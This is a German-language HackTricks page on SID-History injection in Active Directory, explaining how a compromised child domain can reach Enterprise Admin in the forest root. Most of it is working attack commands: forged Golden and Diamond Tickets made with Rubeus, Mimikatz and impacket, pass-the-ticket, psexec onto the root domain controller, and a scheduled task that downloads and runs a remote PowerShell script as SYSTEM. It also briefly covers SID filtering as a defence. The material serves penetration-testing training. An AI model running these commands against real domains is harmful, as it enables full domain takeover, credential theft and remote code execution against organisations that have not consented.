# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID-History-Injection-Angriff

Der Fokus des **SID-History-Injection-Angriffs** liegt darin, die **Benutzermigration zwischen Domains** zu unterstützen und gleichzeitig den fortgesetzten Zugriff auf Ressourcen der früheren Domain zu gewährleisten. Dies wird erreicht, indem der vorherige Security Identifier (SID) des Benutzers in die SID History seines neuen Kontos aufgenommen wird. Dieser Prozess kann jedoch manipuliert werden, um unbefugten Zugriff zu gewähren, indem die SID einer Gruppe mit hohen Berechtigungen (z. B. Enterprise Admins oder Domain Admins) aus der übergeordneten Domain zur SID History hinzugefügt wird. Diese Ausnutzung gewährt Zugriff auf alle Ressourcen innerhalb der übergeordneten Domain.<sup>[[1]](#references)[[2]](#references)</sup>

Für die Ausführung dieses Angriffs gibt es zwei Methoden: die Erstellung eines **Golden Ticket** oder eines **Diamond Ticket**.

Um die SID der Gruppe **„Enterprise Admins“** zu bestimmen, muss zunächst die SID der Root-Domain ermittelt werden. Nach ihrer Identifizierung kann die SID der Enterprise-Admins-Gruppe erstellt werden, indem `-519` an die SID der Root-Domain angehängt wird. Wenn die SID der Root-Domain beispielsweise `S-1-5-21-280534878-1496970234-700767426` lautet, wäre die resultierende SID der Gruppe „Enterprise Admins“ `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>

Du könntest auch die Gruppen **Domain Admins** verwenden, deren SID mit **512** endet.

Eine andere Möglichkeit, die SID einer Gruppe aus der anderen Domain (zum Beispiel „Domain Admins“) zu finden, ist:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Beachte, dass es möglich ist, SID history in einer Trust-Beziehung zu deaktivieren, wodurch dieser Angriff fehlschlägt.

Laut der [**Dokumentation**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Deaktivieren von SIDHistory bei Forest-Trusts** mit dem netdom-Tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Anwenden von SID Filter Quarantining auf externe Trusts** mit dem netdom-Tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Das Anwenden von SID Filtering auf Domain-Trusts innerhalb einer einzelnen Forest** wird nicht empfohlen, da es sich um eine nicht unterstützte Konfiguration handelt und zu Breaking Changes führen kann. Wenn eine Domain innerhalb eines Forests nicht vertrauenswürdig ist, sollte sie kein Mitglied des Forests sein. In dieser Situation müssen die vertrauenswürdigen und nicht vertrauenswürdigen Domains zunächst in separate Forests aufgeteilt werden, damit SID Filtering auf einen Interforest-Trust angewendet werden kann.

Weitere Informationen zum Umgehen dieser Einschränkung findest du in diesem Beitrag: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Beim letzten Versuch musste ich das Argument **`/ldap`** hinzufügen.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) mit KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Für weitere Informationen zu Golden Tickets siehe:


{{#ref}}
golden-ticket.md
{{#endref}}


Für weitere Informationen zu Diamond Tickets siehe:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Mit dem KRBTGT-Hash der kompromittierten Domäne zu DA der Root-Domäne oder Enterprise Admin eskalieren:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Mit den durch den Angriff erworbenen Berechtigungen kannst du beispielsweise einen DCSync attack in der neuen Domäne ausführen:


{{#ref}}
dcsync.md
{{#endref}}

### Von Linux

#### Manuell mit [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatisch mit [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Dies ist ein Impacket-Skript, das die **Eskalation von einer Child-Domäne zur übergeordneten Domäne automatisiert**. Das Skript benötigt:

- Ziel-Domänencontroller
- Anmeldedaten für einen Administratorkonto in der Child-Domäne

Der Ablauf ist:

- Ermittelt die SID der Gruppe „Enterprise Admins“ der übergeordneten Domäne
- Ruft den Hash für das KRBTGT-Konto in der Child-Domäne ab
- Erstellt ein Golden Ticket
- Meldet sich bei der übergeordneten Domäne an
- Ruft die Anmeldedaten für das Administratorkonto in der übergeordneten Domäne ab
- Wenn der Schalter `target-exec` angegeben ist, authentifiziert es sich über Psexec beim Domänencontroller der übergeordneten Domäne.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referenzen

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Was ist ein Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Sicherheitsüberlegungen für Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)

{{#include ../../banners/hacktricks-training.md}}
